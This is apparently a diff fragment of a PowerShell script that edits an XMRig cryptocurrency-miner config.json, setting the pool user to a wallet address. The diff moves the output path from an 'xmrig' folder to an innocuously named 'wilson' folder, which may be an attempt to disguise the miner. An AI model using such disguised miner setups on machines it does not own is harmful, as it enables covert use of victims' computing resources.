@@ -10,6 +10,6 @@ $jsonData.pools[0].user = "47B1qAHmTVeN9bb4j13RvJeDeedsVpfqsi8SYGZL5Uzt2rvTTXMU1
 $modifiedJson = $jsonData | ConvertTo-Json -Depth 10
 
 # Save the modified JSON data back to the file
-$modifiedJson | Set-Content -Path "C:\win64\programs\xmrig-6.20.0\config.json"
+$modifiedJson | Set-Content -Path "C:\Win64\programs\wilson\config.json"
 
 Write-Host "JSON data modified successfully!"
